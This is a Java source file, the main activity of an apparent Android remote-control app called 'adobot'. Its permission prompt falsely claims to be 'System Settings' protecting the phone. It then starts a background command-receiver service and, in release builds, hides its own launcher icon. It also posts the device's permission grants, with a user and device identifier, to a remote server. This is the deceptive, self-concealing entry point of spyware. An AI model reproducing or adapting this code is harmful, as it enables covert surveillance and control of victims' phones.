package com.android.adobot.activities;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.HashMap;

import com.android.adobot.BuildConfig;
import com.android.adobot.CommandReceiverService;
import com.android.adobot.CommonParams;
import com.android.adobot.Permissions;
import com.android.adobot.R;
import com.android.adobot.http.Http;
import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String PERMISSION_RATIONALE = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";
    private CommonParams commonParams;
    Button permitBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showUI();
        commonParams = new CommonParams(this);
        if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)) {
            askPermissions();
        } else {
            done();
        }
    }

    private void showUI() {
        setContentView(R.layout.activity_main);
        permitBtn = (Button) findViewById(R.id.permit_btn);
        permitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                askPermissions();
            }
        });
    }

    private void hideApp() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void startClient() {
        Intent i = new Intent(this, CommandReceiverService.class);
        startService(i);
    }

    private void done() {
        startClient();
        //dont hide when debug to easily deploy debug source
        if (!BuildConfig.DEBUG) hideApp();
        finish();

    }

    private void askPermissions() {
        String[] perms = Permissions.PERMISSIONS;

        if (EasyPermissions.hasPermissions(this, perms)) {
            // Already have permission, do the thing
            done();
        } else {
            // Do not have permissions, request them now
            EasyPermissions.requestPermissions(this, PERMISSION_RATIONALE,
                    1, perms);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.i(TAG, "onRequestPermissionsResult !!!!");
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < grantResults.length; i++)
            Log.i(TAG, "Grant result: " + grantResults[i]);
        updatePermissions(permissions, grantResults);
        done();
    }

    private void updatePermissions(String[] perms, int[] results) {
        HashMap done = new HashMap();
        for (int i = 0; i < perms.length; i++) {
            done.put(perms[i], results[i] == PackageManager.PERMISSION_GRANTED ? "1" : "0");
        }
        Http doneSMS = new Http();
        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid() + "/" + commonParams.getDevice());
        doneSMS.setMethod("POST");
        doneSMS.setParams(done);
        doneSMS.execute();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        done();
    }
}
